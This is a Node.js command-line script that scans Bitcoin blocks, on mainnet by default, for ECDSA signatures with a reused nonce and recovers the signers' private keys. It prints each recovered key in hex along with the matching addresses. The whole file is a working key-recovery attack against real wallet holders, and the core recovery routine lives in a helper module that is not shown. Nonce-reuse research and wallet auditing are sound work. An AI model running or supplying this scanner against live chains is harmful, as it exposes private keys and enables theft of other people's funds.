#!/usr/bin/env node
// scan_reuse.js

const BitcoinRPC = require('./bitcoin_rpc.js');
const CryptoUtils = require('./crypto_utils.js');
const bitcoin = require('bitcoinjs-lib');
const ecpair = require('ecpair'); // For deriving pubkey from privkey

// Basic command line argument parsing
function parseArgs() {
    const args = {};
    for (let i = 2; i < process.argv.length; i++) {
        const arg = process.argv[i];
        if (arg.startsWith('--')) {
            const [key, value] = arg.split('=');
            const argName = key.substring(2);
            if (value !== undefined) {
                args[argName] = value;
            } else if (process.argv[i + 1] && !process.argv[i + 1].startsWith('--')) {
                args[argName] = process.argv[i + 1];
                i++; // consume value
            } else {
                args[argName] = true; // Flag without value
            }
        }
    }
    return args;
}

async function main() {
    const args = parseArgs();

    const startBlock = parseInt(args.startBlock);
    if (isNaN(startBlock)) {
        console.error("Error: --startBlock <number> is required.");
        console.log("Usage: node scan_reuse.js --startBlock <number> [--endBlock <number>] [--network <mainnet|testnet|regtest>] [--host <ip>] [--port <num>] [--user <rpcuser>] [--pass <rpcpass>]");
        return;
    }

    const network = args.network || 'mainnet';
    const host = args.host || 'localhost';
    const port = args.port ? parseInt(args.port) : (network === 'regtest' ? 18443 : (network === 'testnet' ? 18332 : 8332));
    const username = args.user;
    const password = args.pass;

    let endBlock = args.endBlock ? parseInt(args.endBlock) : startBlock + 0; // Default to scan only startBlock if endBlock not specified
     if (isNaN(endBlock) || endBlock < startBlock) {
        console.warn(`Warning: Invalid --endBlock value. Scanning only block ${startBlock}.`);
        endBlock = startBlock;
    }

    console.log(`Starting scan on network: ${network}`);
    console.log(`Connecting to RPC: ${host}:${port} (user: ${username ? username : 'not set'})`);
    console.log(`Scanning blocks from ${startBlock} to ${endBlock}.`);

    const rpcOptions = { host, port, network, username, password };
    const rpc = new BitcoinRPC(rpcOptions);
    const ECPair = ecpair.ECPairFactory(bitcoin.ecc);


    try {
        // Test connection
        console.log("Attempting to connect to Bitcoin node...");
        const blockchainInfo = await rpc.getBlockchainInfo();
        console.log(`Connected. Current block height: ${blockchainInfo.blocks}`);
        if (endBlock > blockchainInfo.blocks) {
            console.warn(`Warning: endBlock (${endBlock}) is greater than current chain height (${blockchainInfo.blocks}). Adjusting endBlock.`);
            endBlock = blockchainInfo.blocks;
        }
        if (startBlock > endBlock) {
            console.error(`Error: startBlock (${startBlock}) is greater than effective endBlock (${endBlock}). Nothing to scan.`);
            return;
        }


        const reuseCandidates = await rpc.findReusedSignatures(startBlock, endBlock);

        if (reuseCandidates.length === 0) {
            console.log("\nNo potential k-reuse candidates found in the scanned range.");
            return;
        }

        console.log(`\nFound ${reuseCandidates.length} potential k-reuse candidates. Attempting private key recovery...`);

        let recoveredCount = 0;
        for (const candidate of reuseCandidates) {
            console.log("\n--------------------------------------------------");
            console.log(`Candidate involving PubKey: ${candidate.pubkeyHex}, R: ${candidate.rHex}`);
            console.log(`  Sig1: txid=${candidate.sig1.txid}, inIndex=${candidate.sig1.inIndex}, block=${candidate.sig1.blockHeight}, s=${candidate.sig1.sHex}, h=${candidate.sig1.messageHashHex}`);
            console.log(`  Sig2: txid=${candidate.sig2.txid}, inIndex=${candidate.sig2.inIndex}, block=${candidate.sig2.blockHeight}, s=${candidate.sig2.sHex}, h=${candidate.sig2.messageHashHex}`);

            const recoveredPrivKeyBigInt = CryptoUtils.recoverPrivateKeyFromKReuse(
                candidate.rHex,
                candidate.sig1.sHex,
                candidate.sig1.messageHashHex,
                candidate.sig2.sHex,
                candidate.sig2.messageHashHex, // Corrected typo here
                CryptoUtils.N_SECP256K1
            );

            if (recoveredPrivKeyBigInt) {
                recoveredCount++;
                const privateKeyHex = recoveredPrivKeyBigInt.toString(16).padStart(64, '0');
                console.log(`  SUCCESS: Recovered Private Key (hex): ${privateKeyHex}`);

                try {
                    const keyPair = ECPair.fromPrivateKey(Buffer.from(privateKeyHex, 'hex'), { network: rpc.bitcoinJsNetwork });
                    const derivedPublicKeyHex = keyPair.publicKey.toString('hex');

                    if (derivedPublicKeyHex === candidate.pubkeyHex) {
                        console.log(`  VERIFIED: Derived public key matches candidate public key.`);
                        const p2pkh = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: rpc.bitcoinJsNetwork });
                        const p2wpkh = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network: rpc.bitcoinJsNetwork });
                        console.log(`    P2PKH Address: ${p2pkh.address}`);
                        console.log(`    P2WPKH Address: ${p2wpkh.address}`);
                    } else {
                        console.error(`  VERIFICATION FAILED: Derived public key ${derivedPublicKeyHex} does NOT match candidate ${candidate.pubkeyHex}.`);
                        console.error(`    This could indicate an issue in recovery or an extremely rare hash collision if different private keys produced same R and pubkey (practically impossible).`);
                    }
                } catch (e) {
                    console.error(`  Error deriving public key or addresses from recovered private key: ${e.message}`);
                }
            } else {
                console.log("  FAILED: Could not recover private key for this candidate.");
            }
        }
        console.log("\n--------------------------------------------------");
        console.log(`Scan complete. Total candidates found: ${reuseCandidates.length}. Private keys recovered: ${recoveredCount}.`);

    } catch (error) {
        console.error("\nAn error occurred during the scan process:", error);
    }
}

main().catch(err => {
    console.error("Unhandled error in main:", err);
});
